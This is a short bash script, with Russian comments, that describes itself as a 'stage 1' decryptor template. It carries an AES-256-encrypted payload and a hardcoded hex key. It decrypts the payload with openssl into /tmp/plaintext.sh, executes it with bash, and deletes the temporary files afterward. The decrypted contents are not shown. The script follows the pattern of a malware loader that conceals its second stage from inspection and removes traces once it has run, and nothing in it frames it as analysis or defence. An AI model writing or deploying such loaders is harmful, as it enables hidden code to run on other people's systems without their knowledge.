#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="7ab777729d73011fc29f91c444b2cf2a:yzlSLgDs+IP6IFouW1Vmg0EjTJNhC35rxV/POfBYhka2iFfc6TYgDZSOlMD9cwRRc0Qnv/i3ZFOJbBqm51+UdFoZ7qRVCAllgZ8g3gvcKPPpLbkjUGKl3X/u3BJ9052F+aDgq5BAOyK6I1jVsiGx/Jcn1g90cC2KGRwtuWZuYBxLHYCIOThOrqAfq5291rFbucH+LIPQJ5lLkMfiQGshL0ShV3AkiZm7Fc61s6Rbl4n62Qw5GgdlCu2PPVsz97Qdzsy7ArZZEbQ8YdZM57CUj7tDua0vqDSSVlMXW5zJtPbN7YSuN+QSwO/DYbyo6lYG5dBMLmFhiAhvOQO5HvRFqMFNsbQAjEoi5aVEC2Z72OqFdWr+GKPoD06aG4Op2YBo7o+t5mLqK7+8OxaA8Ns5tiSc9cexBktQ0mEMCIkotKbNRE8UMRDd54AVWiHSbJ/8gJJ02ZDBHtIk3GgeVs58AIJlLbC68vvHaLG5+BHUXGY="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
